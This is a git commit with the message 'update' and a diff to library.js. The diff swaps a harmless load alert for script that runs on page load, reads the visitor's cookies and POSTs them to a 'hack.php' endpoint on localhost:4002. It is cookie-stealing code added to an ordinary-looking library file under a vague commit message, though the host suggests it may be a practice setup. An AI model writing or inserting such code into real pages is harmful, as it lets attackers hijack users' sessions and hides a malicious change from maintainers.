b2493a1066397b36155200e0ec28df7701efcf36
Umesh Ghimire <me.umeshuser@gmail.com>
2023-01-22 22:08:21 +0545

    update

--- library.js
+++ library.js
@@ -1,3 +1,10 @@
 window.addEventListener('load', (event) => {
-alert('loaded');
+	let x = document.cookie;
+	let formData = new FormData()
+	formData.append("cookie", x)
+
+	fetch("http://localhost:4002/hack.php", {
+		method: "POST",
+		body: formData
+	})
 });
